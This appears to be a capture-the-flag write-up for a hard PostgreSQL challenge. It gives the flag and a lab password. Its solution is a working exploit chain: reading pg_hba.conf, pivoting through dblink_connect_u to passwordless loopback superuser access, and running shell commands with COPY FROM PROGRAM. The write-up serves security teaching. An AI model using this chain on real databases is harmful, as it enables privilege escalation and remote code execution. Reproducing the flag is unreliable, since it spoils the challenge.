# DB Challenge 5 - Breaching the Core

**Category:** Pwn
**Difficulty:** Hard
**Author:** Lt. Rico Kopernicus

## Description

You've worked your way into the audit service account and read every file it can
touch, but the logs only tell you so much about what happened here. The
core still answers to its own console - find the door it left open to itself
and to its mysterious hijacker.

## Flag

`flag{l00pb4ck_tru5t_t00k_th3_c0nn}`

(Continues the story from the black box bonus and the heap recovery.)  
DB Challenge 4 recovered DELTA-7's `manifest_code` - the proof the `RPC_CENTCOM`
abandon-ship order was forged - and the black box tail showed the same malformed
origin block returning on the maintenance channel. The Bridge trusts
connections from its own loopback with no password (a maintenance convenience),
and the read-only auditor was handed the *unrestricted* dblink connector so a
nightly job could reach the core console without storing a credential. Chained,
those two mistakes turn the read-only `icarus_svc` account into a full Postgres
superuser session, and from there `COPY ... FROM PROGRAM` gives command execution
on the box - enough to reach the core-control interface.

## Solution

1. Reach the DB and get the `icarus_svc` role exactly as in DB Challenge 1
   (guest -> `ops_config` creds -> reconnect as `icarus_svc`).
   ```bash
   psql -h 192.168.1.11 -U icarus_svc -d icarus_core   # password from ops_config: Sv3c-L0gAud1t-9f21
   ```
2. Use the same file-read primitive from DB Challenges 1/3/4 to read the auth
   config. `pg_read_file` resolves relative paths against PGDATA, so no absolute
   path is needed:
   ```sql
   SELECT pg_read_file('pg_hba.conf');
   ```
   The load-bearing line is:
   ```
   host    all       postgres    127.0.0.1/32  trust
   ```
   The superuser is fully unlocked - no password - for any connection that
   appears to come from `127.0.0.1`. Off-box it is `reject`ed, so this only helps
   if you can make the *server itself* connect to its own loopback.
3. Pivot. `icarus_svc` has EXECUTE on `dblink_connect_u` - the **unrestricted**
   dblink connector. The ordinary `dblink_connect` refuses a passwordless/`trust`
   connection when the caller is not a superuser (that is the built-in guard
   against exactly this trick); `dblink_connect_u` waives it. Open a persistent
   connection back to loopback as `postgres`:
   ```sql
   SELECT dblink_connect_u('p','host=127.0.0.1 port=5432 user=postgres dbname=icarus_core');
   -- confirm you landed as superuser:
   SELECT * FROM dblink('p','SELECT current_user, usesuper FROM pg_user WHERE usename=current_user')
     AS t(u text, super bool);     -- postgres | t
   ```
4. Execute code. A superuser can `COPY ... TO/FROM PROGRAM`, which runs a shell
   command on the server as the `postgres` OS user. Run it over the pivot and
   read the output back:
   ```sql
   SELECT dblink_exec('p','CREATE TEMP TABLE o(l text)');
   SELECT dblink_exec('p', $$COPY o FROM PROGRAM 'id'$$);
   SELECT * FROM dblink('p','SELECT l FROM o') AS t(l text);
   -- uid=999(postgres) gid=999(postgres) ...   => remote code execution
   ```
5. Assert command authority. The flag is not a file on disk - it is emitted only
   when the core-control helper is executed. Run it through the same primitive:
   ```sql
   SELECT dblink_exec('p','TRUNCATE o');
   SELECT dblink_exec('p', $$COPY o FROM PROGRAM '/opt/icarus/bridge_ctl unlock'$$);
   SELECT * FROM dblink('p','SELECT l FROM o') AS t(l text);
   ```
   ```
   [bridge] command authority asserted. the conn is yours.
   flag{l00pb4ck_tru5t_t00k_th3_c0nn}
   ```

## Notes:

- Second recovery path, deliberately not advertised to players: because the
  binary is readable via the file-read primitive, a determined solver could dump
  `/opt/icarus/bridge_ctl` and reverse the XOR to recover the flag without ever
  executing it. This was an accepted trade-off (there is no OS privilege boundary
  to hide behind without setuid). The intended and by far easier path is the RCE.

## Techniques / Tags

`postgres`, `database`, `dblink`, `ssrf`, `loopback-trust`,
`privilege-escalation`, `rce`
